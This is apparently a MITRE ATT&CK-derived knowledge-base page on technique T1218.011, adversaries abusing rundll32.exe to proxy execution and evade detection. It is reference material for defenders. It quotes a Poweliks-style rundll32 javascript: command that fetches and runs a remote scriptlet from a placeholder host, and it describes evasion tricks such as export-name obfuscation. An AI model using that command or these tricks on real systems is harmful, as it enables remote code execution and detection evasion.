---
mitre_data:
  id: T1218.011
  linker_tags:
  - mitre/attack/linker/stealth/rundll32
  name: Rundll32
  related_tactics:
  - stealth
tags:
- mitre/attack/technique
---



# Rundll32 (`T1218.011`)

Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).

Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute.[^fn7] For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe.

Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks.[^fn3]

Threat actors may also abuse legitimate, signed system DLLs (e.g., <code>zipfldr.dll, ieframe.dll</code>) with <code>rundll32.exe</code> to execute malicious programs or scripts indirectly, making their activity appear more legitimate and evading detection.[^fn6][^fn5]

Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.[^fn2][^fn4] DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).

Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.[^fn1] 


# Platform(s)

- Windows

# Parent Technique(s)

- [[../Techniques/System Binary Proxy Execution (T1218)|System Binary Proxy Execution]]

# Tool(s)

- [[../Tools/PcShare|PcShare]]
- [[../Tools/Koadic|Koadic]]

# Tactic(s)

- [[../Tactics/7. Stealth|Stealth]]


# External Reference(s)

- [T1218.011](https://attack.mitre.org/techniques/T1218/011)

[^fn1]: [Ariel silver. (2022, February 1). Defense Evasion Techniques. Retrieved April 8, 2022.](https://www.cynet.com/attack-techniques-hands-on/defense-evasion-techniques/)
[^fn2]: [Attackify. (n.d.). Rundll32.exe Obscurity. Retrieved August 23, 2021.](https://www.attackify.com/blog/rundll32_execution_order/)
[^fn3]: [B. Ancel. (2014, August 20). Poweliks – Command Line Confusion. Retrieved March 5, 2018.](https://www.stormshield.com/news/poweliks-command-line-confusion/)
[^fn4]: [gtworek. (2019, December 17). NoRunDll. Retrieved August 23, 2021.](https://github.com/gtworek/PSBits/tree/master/NoRunDll)
[^fn5]: [lolbas project. (n.d.). Ieframe.dll. Retrieved October 5, 2025.](https://lolbas-project.github.io/lolbas/Libraries/Ieframe/)
[^fn6]: [lolbas project. (n.d.). Zipfldr.dll. Retrieved October 5, 2025.](https://lolbas-project.github.io/lolbas/Libraries/Zipfldr/)
[^fn7]: [Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017.](https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf)